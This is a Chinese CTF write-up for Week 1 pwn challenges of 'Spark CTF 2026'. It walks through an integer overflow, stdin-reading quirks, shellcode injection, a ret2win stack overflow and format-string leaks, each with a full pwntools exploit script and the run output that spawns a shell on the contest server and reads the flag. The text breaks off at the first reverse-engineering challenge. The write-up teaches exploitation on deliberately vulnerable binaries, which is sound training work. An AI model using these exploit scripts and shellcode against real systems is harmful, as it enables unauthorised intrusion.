# Spark CTF 2026 Writeup

By halfcity987 - 半城

## Week 1

---

## Pwn

### level_up?

#### 分析

IDA 反编译的结果如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int gain; // [rsp+8h] [rbp-8h] BYREF
  int level; // [rsp+Ch] [rbp-4h]

  level = 2147483640;
  puts(s: &s);
  sleep(seconds: 1u);
  puts(s: "> /xp set joker233 2147483640 levels");
  sleep(seconds: 1u);
  puts(s: &s_);
  sleep(seconds: 1u);
  puts(s: &s__0);
  sleep(seconds: 1u);
  fwrite(ptr: &ptr_, size: 1u, n: 2u, s: stdout);
  fflush(stream: stdout);
  setvbuf(stream: stdin, buf: 0, modes: 2, n: 0);
  if ( (unsigned int)__isoc99_scanf(&unk_40209A, &gain) == 1 )
  {
    if ( gain > 0 && gain <= 100 )
    {
      level += gain;
      if ( level >= 0 )
      {
        puts(s: &s__1);
      }
      else
      {
        puts(s: &s__2);
        sleep(seconds: 1u);
        puts(s: &s__3);
        give_shell();
      }
      return 0;
    }
    else
    {
      puts(s: &s__4);
      return 0;
    }
  }
  else
  {
    puts(s: &s__5);
    return 1;
  }
}
```

```bash
.rodata:000000000040209A 25                 unk_40209A      db  25h ; %             ; DATA XREF: main+B1↑o
.rodata:000000000040209B 64                                 db  64h ; d
```

这里允许我们给 int level 加上一个 1-100 的数，其中 `level = 0x7FFFFFF8`，距离溢出只差 8。

因此这里存在整数溢出。

利用也很简单输入一个比 8 大的数字即可。

#### EXP

> 这里我建议写 exp 可以先写一个自己熟悉的模版，设定一些方便的东西，然后再填充内容。
>
> 至少我是挺喜欢这样子的。

```py
from pwn import *

exe = ELF("./level_up")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 29496)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    sendline(b"10")

    interactive()


if __name__ == "__main__":
    main()
```

结果：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/level_up/level_up'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 29496: Done
[*] sending payload: b'10'
[DEBUG] Sent 0x3 bytes:
    b'10\n'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x86 bytes:
    00000000  ef bc 88 e6  89 93 e5 bc  80 4d 43 e8  be 93 e5 85  │····│····│·MC·│····│
    00000010  a5 e6 a1 86  ef bc 89 0a  3e 20 2f 78  70 20 73 65  │····│····│> /x│p se│
    00000020  74 20 6a 6f  6b 65 72 32  33 33 20 32  31 34 37 34  │t jo│ker2│33 2│1474│
    00000030  38 33 36 34  30 20 6c 65  76 65 6c 73  0a e5 b7 b2  │8364│0 le│vels│····│
    00000040  e5 b0 86 6a  6f 6b 65 72  32 33 33 e7  9a 84 e7 bb  │···j│oker│233·│····│
    00000050  8f e9 aa 8c  e7 ad 89 e7  ba a7 e8 ae  be e4 b8 ba  │····│····│····│····│
    00000060  32 31 34 37  34 38 33 36  34 30 0a e4  b8 8d e8 a1  │2147│4836│40··│····│
    00000070  8c ef bc 8c  e5 86 8d e6  9d a5 e4 b8  80 e7 82 b9  │····│····│····│····│
    00000080  ef bc 81 0a  3e 20                                  │····│> │
    00000086
（打开MC输入框）
> /xp set joker233 2147483640 levels
已将joker233的经验等级设为2147483640
不行，再来一点！
> [DEBUG] Received 0x45 bytes:
    00000000  e5 b7 b2 e5  b0 86 6a 6f  6b 65 72 32  33 33 e7 9a  │····│··jo│ker2│33··│
    00000010  84 e7 bb 8f  e9 aa 8c e7  ad 89 e7 ba  a7 e8 ae be  │····│····│····│····│
    00000020  e4 b8 ba 2d  32 31 34 37  34 38 33 36  34 38 0a e5  │···-│2147│4836│48··│
    00000030  b9 b2 2e 2e  2e e5 b9 b2  e4 bb 80 e4  b9 88 e4 ba  │··..│.···│····│····│
    00000040  86 ef bc 9f  0a                                     │····│·│
    00000045
已将joker233的经验等级设为-2147483648
干...干什么了？
[DEBUG] Received 0x13 bytes:
    b'demo\n'
    b'entrypoint.sh\n'
demo
entrypoint.sh
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2b bytes:
    b'flag{3eb1b2ac-5416-0f20-67ad-f84c59b3f462}\n'
flag{3eb1b2ac-5416-0f20-67ad-f84c59b3f462}
$
```

### 哪边是好的

#### 分析

IDA 反编译的结果如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+Ch] [rbp-54h] BYREF
  char dest[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buf = 0;
  inital(argc, argv, envp);
  puts(s: "Level 1. send() vs. sendline()");
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  read(fd: 0, buf: dest, nbytes: 8u);
  if ( strncmp(
         s1: dest,
         s2: good,                                  // "ILovePwn"
         n: 8u) )
  {
    die();
  }
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fgets(s: dest, n: 64, stream: stdin);
  if ( strncmp(
         s1: dest,
         s2: good,                                  // "ILovePwn"
         n: 8u) )
  {
    die();
  }
  puts(s: "Level 2. p32() vs. str()");
  printf(format: "Input: ");
  buf = 0;
  __isoc99_scanf("%d", &buf);
  if ( buf != 1131796 )
    die();
  printf(format: "Do you want a getc(stdin)[y/N]? ");
  read(fd: 0, buf: dest, nbytes: 1u);
  if ( dest[0] == 121 || dest[0] == 89 )
    getc(stream: stdin);
  printf(format: "Input: ");
  buf = 0;
  read(fd: 0, buf: &buf, nbytes: 4u);
  if ( buf != 26318864 )
    die();
  puts(s: "Level 3. \\0 or not");
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fgets(s: dest, n: 9, stream: stdin);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fread(ptr: dest, size: 1u, n: 0xAu, stream: stdin);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  __isoc99_scanf("%8s", dest);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  puts(s: "Congratulations! Give you a shell~");
  system(command: "/bin/sh");
  return 0;
}
```

#### Track 1

题目要求输入 `ILovePwn`。

`read` 仅接受字节流而 `fgets` 需要换行符标识结束。

我们可以这样实现

```py
io.recvuntil(b"Input: ")
send(b"ILovePwn")
io.recvuntil(b"Input: ")
sendline(b"ILovePwn")
```

#### Track 2

此处 `scanf` 接受字符并转化为 int。

选择接受 `getc` 这样就可以将缓冲区中最后的换行符消费掉。

最后同样的 `read` 接受字节流，注意小端打包下：

```py
io.recvuntil(b"Input: ")
sendline(b"1131796")

io.recvuntil(b"Do you want a getc(stdin)[y/N]? ")
send(b"y")

io.recvuntil(b"Input: ")
send(p32(0x1919810))
```

#### Track 3

`fgets` 会在末尾补充一个 `0x00` ，所以这里直接写即可。

`fread` 是直接读取的字节流，我们需要手动补 0x00。

`__isoc99_scanf` 同样，直接写字符串即可。

```py
io.recvuntil(b"Input: ")

send(b"ILovePwn")

io.recvuntil(b"Input: ")
send(b"ILovePwn\x00\x00")

io.recvuntil(b"Input: ")
sendline(b"ILovePwn")
```

#### EXP

完整 exp 如下：

```py
from pwn import *

exe = ELF("./which")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 49945)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b"Input: ")
    send(b"ILovePwn")
    io.recvuntil(b"Input: ")
    sendline(b"ILovePwn")

    io.recvuntil(b"Input: ")
    sendline(b"1131796")

    io.recvuntil(b"Do you want a getc(stdin)[y/N]? ")
    send(b"y")

    io.recvuntil(b"Input: ")
    send(p32(0x1919810))

    io.recvuntil(b"Input: ")

    send(b"ILovePwn")

    io.recvuntil(b"Input: ")
    send(b"ILovePwn\x00\x00")

    io.recvuntil(b"Input: ")
    sendline(b"ILovePwn")

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/which_good/which'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 49945: Done
[DEBUG] Received 0x1e bytes:
    b'Level 1. send() vs. sendline()'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x8 bytes:
    b'ILovePwn'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x9 bytes:
    b'ILovePwn\n'
[+] payload sent
[DEBUG] Received 0x18 bytes:
    b'Level 2. p32() vs. str()'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'1131796'
[DEBUG] Sent 0x8 bytes:
    b'1131796\n'
[+] payload sent
[DEBUG] Received 0x20 bytes:
    b'Do you want a getc(stdin)[y/N]? '
[*] sending payload: b'y'
[DEBUG] Sent 0x1 bytes:
    b'y'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'\x10\x98\x91\x01'
[DEBUG] Sent 0x4 bytes:
    00000000  10 98 91 01                                         │····│
    00000004
[+] payload sent
[DEBUG] Received 0x12 bytes:
    b'Level 3. \\0 or not'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x8 bytes:
    b'ILovePwn'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn\x00\x00'
[DEBUG] Sent 0xa bytes:
    00000000  49 4c 6f 76  65 50 77 6e  00 00                     │ILov│ePwn│··│
    0000000a
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x9 bytes:
    b'ILovePwn\n'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x22 bytes:
    b'Congratulations! Give you a shell~'
Congratulations! Give you a shell~[DEBUG] Received 0x1 bytes:
    b'\n'

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2b bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'which\n'
bin
dev
flag
lib
lib32
lib64
libexec
which
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x26 bytes:
    b'flag{PwnTOoL5-lS_POw3rfU1-8b51810162}\n'
flag{PwnTOoL5-lS_POw3rfU1-8b51810162}
$
```

### Abyss Shellcode

#### 分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-18h]

  setbuf(stream: stdin, buf: 0);
  setbuf(stream: stdout, buf: 0);
  setbuf(stream: stderr, buf: 0);
  puts(s: "Give me your shellcode:");
  buf = mmap(addr: 0, len: 0x1000u, prot: 7, flags: 34, fd: -1, offset: 0);
  if ( buf == (void *)-1LL )
  {
    perror(s: "mmap");
    exit(status: 1);
  }
  if ( read(fd: 0, buf: buf, nbytes: 0x1000u) <= 0 )
  {
    puts(s: "No shellcode?");
    exit(status: 1);
  }
  ((void(void))buf)();
  return 0;
}
```

逻辑很简单，读取输入到分配的一页 rwx 内存，然后执行。

直接写 shellcode 即可。

### EXP

```py
from pwn import *

exe = ELF("./pwn")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 24256)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    send(asm(shellcraft.sh()))

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/abyssshellcode/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 24256: Done
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/99cb4b07dea4b242573197a57eaac16709adb122'
[*] sending payload: b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[DEBUG] Sent 0x30 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x18 bytes:
    b'Give me your shellcode:\n'
Give me your shellcode:
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2d bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libs\n'
    b'pwn\n'
    b'secret\n'
bin
dev
flag
lib
lib32
lib64
libs
pwn
secret
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2a bytes:
    b'flag{82d591ff-4d62-ce64-bd65-837a1ff723b9}'
flag{82d591ff-4d62-ce64-bd65-837a1ff723b9}$
```

### Heavensdoor

#### 分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf_; // [rsp+0h] [rbp-28h] BYREF

  setvbuf(stream: stdout, buf: 0, modes: 2, n: 0);
  setvbuf(stream: stdin, buf: 0, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: 0, modes: 2, n: 0);
  puts(s: "**************************************");
  puts(s: "*          H e a v e n s d o o r     *");
  puts(s: "**************************************");
  puts(s: "You found a door nobody ever opens.");
  puts(s: "Now, knock.");
  read(fd: 0, buf: &buf_, nbytes: 0x100u);
  puts(s: "Nothing happens... right?");
  return 0;
}

int heavens_door()
{
  puts(s: "Knock, knock.");
  puts(s: "It's open. Come in.");
  system(command: "/bin/sh");
  return puts(s: "The door closes behind you.");
}
```

在 IDA 中可以看到后门函数，因此这个题目是 ret2win。

```bash
-0000000000000028 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000028 // Frame size: 28; Saved regs: 0; Purge: 0
-0000000000000028
-0000000000000028     // padding byte
-0000000000000027     // padding byte
-0000000000000026     // padding byte
-0000000000000025     // padding byte
-0000000000000024     // padding byte
-0000000000000023     // padding byte
-0000000000000022     // padding byte
-0000000000000021     // padding byte
-0000000000000020     // padding byte
-000000000000001F     // padding byte
-000000000000001E     // padding byte
-000000000000001D     // padding byte
-000000000000001C     // padding byte
-000000000000001B     // padding byte
-000000000000001A     // padding byte
-0000000000000019     // padding byte
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     // padding byte
-0000000000000013     // padding byte
-0000000000000012     // padding byte
-0000000000000011     // padding byte
-0000000000000010     // padding byte
-000000000000000F     // padding byte
-000000000000000E     // padding byte
-000000000000000D     // padding byte
-000000000000000C     // padding byte
-000000000000000B     // padding byte
-000000000000000A     // padding byte
-0000000000000009     // padding byte
-0000000000000008     // padding byte
-0000000000000007     // padding byte
-0000000000000006     // padding byte
-0000000000000005     // padding byte
-0000000000000004     // padding byte
-0000000000000003     // padding byte
-0000000000000002     // padding byte
-0000000000000001     // padding byte
+0000000000000000     _UNKNOWN *__return_address;
```

padding 大小是 0x28 存在明显溢出。

```bash
❯ ROPgadget --binary heavensdoor|grep ret
0x00000000004011ab : add bh, bh ; loopne 0x401215 ; nop ; ret
0x000000000040117c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040117e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401219 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011aa : add dil, dil ; loopne 0x401215 ; nop ; ret
0x000000000040121c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401217 : add eax, 0x2e6b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401145 : add esp, 0x28 ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401144 : add rsp, 0x28 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401183 : cli ; ret
0x0000000000401277 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401180 : endbr64 ; ret
0x0000000000401218 : imul ebp, dword ptr [rsi], 0 ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011ad : loopne 0x401215 ; nop ; ret
0x0000000000401216 : mov byte ptr [rip + 0x2e6b], 1 ; pop rbp ; ret
0x00000000004011af : nop ; ret
0x000000000040121d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401279 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401278 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401142 : xor eax, eax ; add rsp, 0x28 ; ret
```

这里有 ret 的 gadget 可以用于栈 16 字节对齐。

#### EXP

```py
from pwn import *

exe = ELF("./heavensdoor")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 28785)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    backdoor = 0x401240
    ret = 0x40101a

    io.recvuntil(b"Now, knock.")

    payload = b"A" * 0x28
    payload += p64(ret)
    payload += p64(backdoor)

    send(payload)

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/heavensdoor/heavensdoor'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 28785: Done
[DEBUG] Received 0xa5 bytes:
    b'**************************************\n'
    b'*          H e a v e n s d o o r     *\n'
    b'**************************************\n'
    b'You found a door nobody ever opens.\n'
    b'Now, knock.\n'
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00@\x12@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x38 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  40 12 40 00  00 00 00 00                            │@·@·│····│
    00000038
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode

[DEBUG] Received 0x3c bytes:
    b'Nothing happens... right?\n'
    b'Knock, knock.\n'
    b"It's open. Come in.\n"
Nothing happens... right?
Knock, knock.
It's open. Come in.
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2e bytes:
    b'flag{KnOck-KN0CK_h34v3NSd0Or-0P3N3de1f3142d3}\n'
flag{KnOck-KN0CK_h34v3NSd0Or-0P3N3de1f3142d3}
$
```

### 格式化打印机

#### Track 1

```bash
❯ nc 110.42.112.160 48200
=== 格式化打印机 ===
8 个位置里放着一些数，你需要用格式串找到标记，再完成目标
%lx 依次取数并打印十六进制；点号只是分隔符，l 是小写字母 L
直接输入格式串可以探索；输入 submit 后，下一行才作为答案
hint：思路  map：已发现的位置  explore：取消提交  quit：退出

=== 1/3  找到标记 ===
  找到 41414141，先试着打印，确定它是第几个数
  最后只用一个取数规则打印它，不能直接写数字

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | ???????? | -        |
  | 2    | RDX          | ???????? | -        |
  | 3    | RCX          | ???????? | -        |
  | 4    | R8           | ???????? | -        |
  | 5    | R9           | ???????? | -        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | ???????? | -        |
  | 7    | [RSP+0x10]   | ???????? | -        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

探索>
```

根据题目要求我们需要利用格式化字符串打印目标数据。

> 格式化字符串打印的公式如下：%[参数位置$][标志][宽度][.精度][长度]转换符

> 注：格式化字符串的参数是虚拟参数，参数偏移依赖 System V ABI 的传参约定，

我们先检查一下寄存器和栈上的值：

```bash
探索> %lx.%lx.%lx.%lx.%lx.%lx.%lx
  你写的规则：[%lx.%lx.%lx.%lx.%lx.%lx.%lx]
  打印结果：  [2a.22222222.33333333.44444444.55555555.42424242.41414141]

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | 0000002a | 1        |
  | 2    | RDX          | 22222222 | 2        |
  | 3    | RCX          | 33333333 | 3        |
  | 4    | R8           | 44444444 | 4        |
  | 5    | R9           | 55555555 | 5        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | 42424242 | 6        |
  | 7    | [RSP+0x10]   | 41414141 | 7        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

  它是这样取数的（从第 1 个开始）：
  第 1 步  %lx      -> 第 1 个数 -> RSI          -> 打印 2a
  第 2 步  %lx      -> 第 2 个数 -> RDX          -> 打印 22222222
  第 3 步  %lx      -> 第 3 个数 -> RCX          -> 打印 33333333
  第 4 步  %lx      -> 第 4 个数 -> R8           -> 打印 44444444
  第 5 步  %lx      -> 第 5 个数 -> R9           -> 打印 55555555
  第 6 步  %lx      -> 第 6 个数 -> [RSP+0x08]   -> 打印 42424242
  第 7 步  %lx      -> 第 7 个数 -> [RSP+0x10]   -> 打印 41414141
  这里只是把数取出来打印，原来的数没有被改动
  [探索] 准备好后输入 submit
```

提交参数偏移 7 处的值即可：

```bash  
探索> submit
下一行提交答案，最多 16 个字符

提交> %7$lx
  你写的规则：[%7$lx]
  打印结果：  [41414141]
```

#### Track 2

```bash
=== 2/3  编号还是宽度 ===
  目标：000041414141.000042424242
  找到两个标记，按这个顺序打印，每个补零到 12 位
  最终格式串最多 17 个字符；探索时不受这个限制
```

再次检查一下数值：

```bash
探索> %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
  你写的规则：[%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx]
  打印结果：  [2a.22222222.33333333.44444444.55555555.42424242.41414141.88888888]

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | 0000002a | 1        |
  | 2    | RDX          | 22222222 | 2        |
  | 3    | RCX          | 33333333 | 3        |
  | 4    | R8           | 44444444 | 4        |
  | 5    | R9           | 55555555 | 5        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | 42424242 | 6        |
  | 7    | [RSP+0x10]   | 41414141 | 7        |
  | 8    | [RSP+0x18]   | 88888888 | 8        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

  它是这样取数的（从第 1 个开始）：
  第 1 步  %lx      -> 第 1 个数 -> RSI          -> 打印 2a
  第 2 步  %lx      -> 第 2 个数 -> RDX          -> 打印 22222222
  第 3 步  %lx      -> 第 3 个数 -> RCX          -> 打印 33333333
  第 4 步  %lx      -> 第 4 个数 -> R8           -> 打印 44444444
  第 5 步  %lx      -> 第 5 个数 -> R9           -> 打印 55555555
  第 6 步  %lx      -> 第 6 个数 -> [RSP+0x08]   -> 打印 42424242
  第 7 步  %lx      -> 第 7 个数 -> [RSP+0x10]   -> 打印 41414141
  第 8 步  %lx      -> 第 8 个数 -> [RSP+0x18]   -> 打印 88888888
  这里只是把数取出来打印，原来的数没有被改动
  [探索] 准备好后输入 submit
```

提交 `%7$012lx.%6$012lx` 即可。

其中 `%` 是固定的起始符号，`N$` 表示参数偏移，`012lx` 中的 `l` 表示 long 类型，`x` 表示以 hex 也就是 16 进制小写的方式输出，`012`表示使用0将长度填充到12

```bash
探索> submit
下一行提交答案，最多 17 个字符

提交> %7$012lx.%6$012lx
  你写的规则：[%7$012lx.%6$012lx]
  打印结果：  [000041414141.000042424242]
```

#### Track 3

```bash
=== 3/3  重新定位，再组合 ===
  位置已重新打乱，之前的编号不能直接照搬
  目标：42424242.41414141.41414141.0000002a.%
  先找位置，再按顺序取数；同一个标记要取两次，最多 40 个字符

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | ???????? | -        |
  | 2    | RDX          | ???????? | -        |
  | 3    | RCX          | ???????? | -        |
  | 4    | R8           | ???????? | -        |
  | 5    | R9           | ???????? | -        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | ???????? | -        |
  | 7    | [RSP+0x10]   | ???????? | -        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置
```

最后的综合利用。

payload 如下：

```bash
提交> %3$08lx.%2$08lx.%2$08lx.%7$08lx.%%
  你写的规则：[%3$08lx.%2$08lx.%2$08lx.%7$08lx.%%]
  打印结果：  [42424242.41414141.41414141.0000002a.%]
```

其中 `%%` 表示输出 字面量 `%`，其他的参考 Track 2 即可。

获取 flag：

```bash
输入 cat /flag 查看 flag
cat /flag
flag{ae7f3687-270c-9188-5a44-29657146d926}
```

## Reverse

### 提瓦特委托局·一：欢迎来到逆向世界

#### 分析

执行程序，看到输出如下，判断 flag 可能需要拼接出来：

